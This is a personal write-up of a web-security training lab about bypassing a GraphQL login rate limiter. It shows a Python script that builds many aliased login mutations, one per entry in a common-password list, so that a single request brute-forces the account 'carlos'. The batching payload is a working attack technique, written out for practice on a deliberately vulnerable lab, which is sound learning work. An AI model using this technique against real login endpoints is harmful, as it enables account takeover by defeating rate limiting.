# Practitioner Lab 105: Bypassing GraphQL brute force protections

---

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.

![Untitled](Practitioner%20Lab%20105%20Bypassing%20GraphQL%20brute%20force%20f42fcb909ef142359f6cbf522684e61a/Untitled.png)

```

    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }
```

It was originally like this but I wanted to change it to make bruteforcing easier 

so I removed the variables and made it into this:

```

    mutation login {
        login(input: { username: "wiener", password: "peter" }) {
            token
            success
        }
    }

```

Now I can create mutations and add more passwords

![Untitled](Practitioner%20Lab%20105%20Bypassing%20GraphQL%20brute%20force%20f42fcb909ef142359f6cbf522684e61a/Untitled%201.png)

This is a trial to see if it worked or not.

```
passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]
counter=1
for i in passwords:
    print(f'attempt'+str(counter)+':login(input: { username: "carlos", password: "'+i+'" }){token success}')
    counter+=1
    
```

using this simple python script I was able to get all the password iterations into one request.

this gave me the password for carlos

![Untitled](Practitioner%20Lab%20105%20Bypassing%20GraphQL%20brute%20force%20f42fcb909ef142359f6cbf522684e61a/Untitled%202.png)

![Untitled](Practitioner%20Lab%20105%20Bypassing%20GraphQL%20brute%20force%20f42fcb909ef142359f6cbf522684e61a/Untitled%203.png)